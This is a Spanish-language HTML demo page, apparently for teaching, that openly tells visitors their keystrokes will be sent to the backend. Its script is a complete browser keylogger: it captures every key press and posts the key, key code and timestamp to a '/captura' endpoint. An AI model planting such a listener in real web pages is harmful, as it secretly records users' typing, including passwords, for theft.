<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Keylogger Demo</title>
</head>
<body>
  <h1>Demo: Keylogger Web</h1>
  <p>Pulsa cualquier tecla y se enviará al backend.</p>

  <button onclick="window.location.href='index.html'">Volver a Inicio</button>

  <script>
    document.addEventListener('keydown', function(e) {
      // Usar la URL actual del servidor (funciona tanto en local como en producción)
      const baseUrl = window.location.origin;
      
      fetch(`${baseUrl}/captura`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          key: e.key,
          code: e.code,
          time: new Date().toISOString()
        })
      }).then(response => {
        if (response.ok) {
          console.log('Tecla capturada:', e.key);
        }
      }).catch(error => {
        console.error('Error al enviar datos:', error);
      });
    });
  </script>
</body>
</html>
